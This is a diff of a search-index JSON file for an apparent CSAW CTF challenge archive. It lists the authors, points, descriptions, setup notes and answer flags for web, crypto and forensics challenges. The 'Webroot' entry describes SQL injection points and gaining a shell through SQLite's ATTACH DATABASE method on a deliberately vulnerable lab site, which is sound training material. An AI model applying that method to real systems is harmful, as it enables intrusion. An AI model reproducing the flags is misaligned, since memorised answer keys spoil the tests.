+            "text": "Hashes\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nlocation, location, location\n\n\nFlag\n\n\nflag{these_browser_bots_are_annoying}\n\n\nSolution\n\n\nSetup", 
+            "title": "Hashes"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#hashes", 
+            "text": "", 
+            "title": "Hashes"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#author", 
+            "text": "Chung", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#description", 
+            "text": "location, location, location", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#flag", 
+            "text": "flag{these_browser_bots_are_annoying}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/", 
+            "text": "Webroot\n\n\nAuthor\n\n\nFreeman\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhackerhaikus.com\n\n\nFlag\n\n\nflag{rise_and_shine,_mr._freeman._rise_and_shine}\n\n\nSolution\n\n\n\n\nThere are two SQL injection vulnerabilities in the \"saveHaiku\" call; one in the timestamp and one in the encrypted haiku. First one requires changing the AMF type from number to string (no tools available, requires hex munging), second requires enumerating the DES_ECB key and encrypting a payload that way.\n\n\nBackend DB is SQLite3. Shell will probably be gained with the \"ATTACH DATABASE\" method outlined here: \nhttp://atta.cked.me/home/sqlite3injectioncheatsheet\n\n\nThere might also be bugs in Amfphp itself. In fact there almost certainly are. I haven't had time to test for these.\n\n\n\n\nSetup\n\n\nPlease find attached webroot.tgz. Some notes on setup:\n* Needs mcrypt and sqlite3 PHP extensions enabled\n* Apache should be configured with hackerhaikus.com as the virtual host (DNS is already pointing to the IP specified on IRC yesterday)\n* test2.php is meant to be there, it discloses the webroot which is needed for exploitation.\n\n\nNotes\n\n\n\n\nProbably just dump a file readable by www-data in /opt or something.\n\n\nI have no idea how points work for this, and how this ranks in complexity compared to the other challenges, and therefore have no idea how many points to assign for the challenge ;)", 
+            "title": "Webroot"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#webroot", 
+            "text": "", 
+            "title": "Webroot"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#author", 
+            "text": "Freeman", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#description", 
+            "text": "hackerhaikus.com", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#flag", 
+            "text": "flag{rise_and_shine,_mr._freeman._rise_and_shine}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#solution", 
+            "text": "There are two SQL injection vulnerabilities in the \"saveHaiku\" call; one in the timestamp and one in the encrypted haiku. First one requires changing the AMF type from number to string (no tools available, requires hex munging), second requires enumerating the DES_ECB key and encrypting a payload that way.  Backend DB is SQLite3. Shell will probably be gained with the \"ATTACH DATABASE\" method outlined here:  http://atta.cked.me/home/sqlite3injectioncheatsheet  There might also be bugs in Amfphp itself. In fact there almost certainly are. I haven't had time to test for these.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#setup", 
+            "text": "Please find attached webroot.tgz. Some notes on setup:\n* Needs mcrypt and sqlite3 PHP extensions enabled\n* Apache should be configured with hackerhaikus.com as the virtual host (DNS is already pointing to the IP specified on IRC yesterday)\n* test2.php is meant to be there, it discloses the webroot which is needed for exploitation.", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/web/webroot_-_Freeman/#notes", 
+            "text": "Probably just dump a file readable by www-data in /opt or something.  I have no idea how points work for this, and how this ranks in complexity compared to the other challenges, and therefore have no idea how many points to assign for the challenge ;)", 
+            "title": "Notes"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/", 
+            "text": "Silk Goat\n\n\nAuthor\n\n\nAhmed\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n{{hacker manifesto}}\n\n\nFlag\n\n\nflag{silkroad4ever}\n\n\nSolution\n\n\nSetup", 
+            "title": "Silkgoat"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#silk-goat", 
+            "text": "", 
+            "title": "Silk Goat"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#author", 
+            "text": "Ahmed", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#description", 
+            "text": "{{hacker manifesto}}", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#flag", 
+            "text": "flag{silkroad4ever}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/silkgoat/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/cryptography/introduction/", 
-            "text": "Cryptography", 
+            "text": "Cryptography\n\n\n\n\nXOR\n\n\nBlock Modes of Operation", 
             "title": "Introduction"
         }, 
         {
             "location": "/cryptography/introduction/#cryptography", 
-            "text": "", 
+            "text": "XOR  Block Modes of Operation", 
             "title": "Cryptography"
         }, 
         {
@@ -2926,6 +4546,186 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/crypto/notesy/", 
+            "text": "Notesy\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nUNHMAQWZIDYPRCJKBGVSLOETXF\n\n\nSolution\n\n\nSetup", 
+            "title": "Notesy"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#notesy", 
+            "text": "", 
+            "title": "Notesy"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#author", 
+            "text": "Chung", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#flag", 
+            "text": "UNHMAQWZIDYPRCJKBGVSLOETXF", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/notesy/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/", 
+            "text": "EPS (1-3)\n\n\n\n\nones_and_zer0es\n\n\nwh1ter0se\n\n\nzer0_day\n\n\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n50 (each)\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\n\n\n\n\nNote: The flag is the entire thing decrypted\n\n\n\n\n\n\nFlag\n\n\n\n\nflag{People always make the best exploits.}\n\n\nBUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING BEAUTIFUL. WE'VE BEEN FOCUSED ON WHAT'S IN FRONT OF US. BUT WE HAVEN'T BEEN LOOKING AT WHAT'S ABOVE US.\n\n\nflag{We are fsociety, we are finally free, we are finally awake!}\n\n\n\n\nSolution\n\n\nSetup\n\n\nDistribute\n1. eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg\n2. eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v\n3. eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi", 
+            "title": "EPS"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#eps-1-3", 
+            "text": "ones_and_zer0es  wh1ter0se  zer0_day", 
+            "title": "EPS (1-3)"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#author", 
+            "text": "Chung", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#points", 
+            "text": "50 (each)", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#description", 
+            "text": "Note: The flag is the entire thing decrypted", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#flag", 
+            "text": "flag{People always make the best exploits.}  BUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING BEAUTIFUL. WE'VE BEEN FOCUSED ON WHAT'S IN FRONT OF US. BUT WE HAVEN'T BEEN LOOKING AT WHAT'S ABOVE US.  flag{We are fsociety, we are finally free, we are finally awake!}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/eps/#setup", 
+            "text": "Distribute\n1. eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg\n2. eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v\n3. eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/", 
+            "text": "Punchout\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n125\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nWe found these System/360 punch cards and we need to extract the data. We already read the data off for you. It looks encrypted. Can you help?\n\n\nFlag\n\n\nflag{https://i.imgur.com/ZNem5o3.gifv}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \npunchout.tar.xz-24504ddc1e81092010497ee49fc52e1c", 
+            "title": "Punchout"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#punchout", 
+            "text": "", 
+            "title": "Punchout"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#author", 
+            "text": "Stortz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#points", 
+            "text": "125", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#description", 
+            "text": "We found these System/360 punch cards and we need to extract the data. We already read the data off for you. It looks encrypted. Can you help?", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#flag", 
+            "text": "flag{https://i.imgur.com/ZNem5o3.gifv}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/punchout/#setup", 
+            "text": "Distribute  punchout.tar.xz-24504ddc1e81092010497ee49fc52e1c", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/", 
+            "text": "Feal\n\n\nAuthor\n\n\nAgre\n\n\nPoints\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{FealMeBaby}\n\n\nSolution\n\n\nSetup", 
+            "title": "Feal"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#feal", 
+            "text": "", 
+            "title": "Feal"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#author", 
+            "text": "Agre", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#points", 
+            "text": "", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#flag", 
+            "text": "key{FealMeBaby}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/feal/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2017/crypto/almost_xor/", 
             "text": "almost_xor\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nCan you decode this ciphertext?\n809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf462deae51872673dcd34cc9f55380cb86951b8be3d8429839\nUpdate Sun 3:24 Eastern: merged the 2 lines to make it clear that it's a single ciphertext, no actual change to challenge.\n\n\nFlag\n\n\nflag{\nx0r_i5_Add1+10n-m0D-2,'bU+_+h15_Wa5_m0d=8}\n\n\nSolution\n\n\nalmostxorsolution.py\n\n\nSetup\n\n\nGive players almost_xor.py and this ciphertext:\n\n\n809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf4\n62deae51872673dcd34cc9f55380cb86951b8be3d8429839", 
             "title": "Almost XOR"
@@ -3098,6 +4898,136 @@
         {
             "location": "/challenges/2016/crypto/Killer_cipher/#setup", 
             "text": "only ciphertext is provided", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/", 
+            "text": "check-plz\n\n\nAuthor\n\n\nSingh\n\n\nPoints\n\n\n250\n\n\nDescription\n\n\nWe just recently set up our crypto for a new project. We'll give you the flag if you can guess the resulting mac. Try the stripped down version here:\n\nnc 52.91.89.84 4000\n\n\nFlag\n\n\nSolution\n\n\nSetup\n\n\nsource : \nhttps://gist.github.com/gsingh93/755905ada3053e0365c1", 
+            "title": "Check Plz"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#check-plz", 
+            "text": "", 
+            "title": "check-plz"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#author", 
+            "text": "Singh", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#description", 
+            "text": "We just recently set up our crypto for a new project. We'll give you the flag if you can guess the resulting mac. Try the stripped down version here: nc 52.91.89.84 4000", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/check-plz/#setup", 
+            "text": "source :  https://gist.github.com/gsingh93/755905ada3053e0365c1", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/", 
+            "text": "Psifer School\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nThere's no heartbleed here. Why don't we use these ciphers?\n\n\nFlag\n\n\nflag{IGraduatedPsiferSchoolAndAllIGotWasThisLousyFlag}\n\n\nSolution\n\n\nsolveschool.py\n\n\nSetup", 
+            "title": "Psifer School"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#psifer-school", 
+            "text": "", 
+            "title": "Psifer School"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#description", 
+            "text": "There's no heartbleed here. Why don't we use these ciphers?", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#flag", 
+            "text": "flag{IGraduatedPsiferSchoolAndAllIGotWasThisLousyFlag}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#solution", 
+            "text": "solveschool.py", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/psifer_school/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/", 
+            "text": "Mountain Sound\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{It's not the one that goes 'huuuhh!'}\n\n\nSolution\n\n\nSetup", 
+            "title": "Mountainsound"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#mountain-sound", 
+            "text": "", 
+            "title": "Mountain Sound"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#author", 
+            "text": "Stortz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#flag", 
+            "text": "key{It's not the one that goes 'huuuhh!'}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#setup", 
+            "text": "", 
             "title": "Setup"
         }, 
         {
@@ -3323,6 +5253,186 @@
         {
             "location": "/challenges/2016/crypto/Another_Broken_Box/#setup", 
             "text": "crypto400.py should be provided", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/", 
+            "text": "Slabs of Platinum\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nCryptography\n\n\nDescription\n\n\nYou showed great skill with the last target! But we have found the encrypted image and remnants of an even more complex encryption scheme.\nCan you help us?\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/negasora/CTFWriteups/tree/master/CSAW-Finals-2015/Slabs-of-Platinum---Crypto-500\n\n\n\n\nSetup\n\n\nslabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3\n\n\nreal_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852", 
+            "title": "Slabs of Platinum"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#slabs-of-platinum", 
+            "text": "", 
+            "title": "Slabs of Platinum"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#author", 
+            "text": "D'Antoine", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#category", 
+            "text": "Cryptography", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#description", 
+            "text": "You showed great skill with the last target! But we have found the encrypted image and remnants of an even more complex encryption scheme.\nCan you help us?", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#solution", 
+            "text": "https://github.com/negasora/CTFWriteups/tree/master/CSAW-Finals-2015/Slabs-of-Platinum---Crypto-500", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/slabs-of-platinum/#setup", 
+            "text": "slabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3  real_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/", 
+            "text": "Bricks of Gold\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nWe've captured this encrypted file being smuggled into the country. All we know is that they rolled their own custom CBC mode algorithm - its probably terrible.\nHINT: take a second look at the file for elements needed for the crypto\n\n\nFlag\n\n\nflag{c4sh_Rul3s_ev3ryTh1ng_4r0und_m3}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nbricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878", 
+            "title": "Bricks of Gold"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#bricks-of-gold", 
+            "text": "", 
+            "title": "Bricks of Gold"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#author", 
+            "text": "D'Antoine", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#description", 
+            "text": "We've captured this encrypted file being smuggled into the country. All we know is that they rolled their own custom CBC mode algorithm - its probably terrible.\nHINT: take a second look at the file for elements needed for the crypto", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#flag", 
+            "text": "flag{c4sh_Rul3s_ev3ryTh1ng_4r0und_m3}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/crypto/bricks_of_gold/#setup", 
+            "text": "Distribute  bricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/", 
+            "text": "CFB Sum\n\n\nAuthor\n\n\nAgre\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{This is my pad there are many like it but this pad is my own}\n\n\nSolution\n\n\nSetup", 
+            "title": "CFB Sum"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#cfb-sum", 
+            "text": "", 
+            "title": "CFB Sum"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#author", 
+            "text": "Agre", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#flag", 
+            "text": "key{This is my pad there are many like it but this pad is my own}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/cfbsum/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/", 
+            "text": "Wieners\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nLogic Analyzer -\n RE -\n Morse Code -\n Key\n\n\nFlag\n\n\nkey{http://imgur.com/XYlLNrk}\n\n\nSolution\n\n\nIn \nsolution/\n\n\nSetup\n\n\nDistribute \nwieners.7z", 
+            "title": "Wieners"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#wieners", 
+            "text": "", 
+            "title": "Wieners"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#author", 
+            "text": "Antoniewicz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#category", 
+            "text": "Crypto", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#description", 
+            "text": "Logic Analyzer -  RE -  Morse Code -  Key", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#flag", 
+            "text": "key{http://imgur.com/XYlLNrk}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#solution", 
+            "text": "In  solution/", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#setup", 
+            "text": "Distribute  wieners.7z", 
             "title": "Setup"
         }, 
         {
@@ -3586,6 +5696,276 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/", 
+            "text": "Phish It, Phish It Good\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nSomeone got phished after running an executable, help me find out what info the attacker obtained.\nNote: The format for this challenge is key{}\n\n\nFlag\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nbustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z", 
+            "title": "Phish it, Phish it Good"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#phish-it-phish-it-good", 
+            "text": "", 
+            "title": "Phish It, Phish It Good"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#author", 
+            "text": "Antoniewicz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#description", 
+            "text": "Someone got phished after running an executable, help me find out what info the attacker obtained.\nNote: The format for this challenge is key{}", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#setup", 
+            "text": "Distribute  bustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/", 
+            "text": "Pcap'in\n\n\nAuthor\n\n\nNevens\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe have extracted a pcap file from a network where attackers were present.  We know they were using some kind of file transfer protocol on TCP port 7179.  We're not sure what file or files were transferred and we need you to investigate.  We do not believe any strong cryptography was employed.\n\n\nFlag\n\n\ns1mp!3_n37w0rk_c4@1l3nge\n\n\nSolution\n\n\nSetup", 
+            "title": "Pcapin"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#pcapin", 
+            "text": "", 
+            "title": "Pcap'in"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#author", 
+            "text": "Nevens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#points", 
+            "text": "150", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#description", 
+            "text": "We have extracted a pcap file from a network where attackers were present.  We know they were using some kind of file transfer protocol on TCP port 7179.  We're not sure what file or files were transferred and we need you to investigate.  We do not believe any strong cryptography was employed.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#flag", 
+            "text": "s1mp!3_n37w0rk_c4@1l3nge", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/pcapin/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
